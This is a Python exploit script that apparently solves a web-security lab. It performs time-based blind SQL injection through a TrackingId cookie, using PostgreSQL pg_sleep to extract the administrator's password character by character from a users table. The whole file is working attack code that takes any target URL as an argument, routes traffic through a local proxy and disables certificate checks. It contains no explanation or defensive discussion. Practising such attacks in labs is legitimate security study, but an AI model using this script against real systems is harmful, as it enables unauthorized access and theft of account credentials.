import sys
import requests
import urllib3
import urllib.parse
from typing import Dict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXIES: Dict[str, str] = {
    'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def sqli_password(url: str) -> None:
    password_extracted = ""
    session = requests.Session()
    for i in range(1, 21):
        for j in range(32, 126):
            sql_payload = (
                f"' || (select case when (username='administrator' "
                f"and ascii(substring(password,{i},1))={j}) then pg_sleep(10) "
                f"else pg_sleep(-1) end from users)--"
            )
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {
                'TrackingId': f'4kvqBxnpvcbcGVXk{sql_payload_encoded}',
                'session': 'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'
            }
            response = session.get(url, cookies=cookies,
                                   verify=False, proxies=PROXIES)
            if int(response.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write(f'\r{password_extracted}')
                sys.stdout.flush()
                break
            else:
                sys.stdout.write(f'\r{password_extracted}{chr(j)}')
                sys.stdout.flush()
    print()  # To ensure the final password is printed cleanly


def main() -> None:
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()
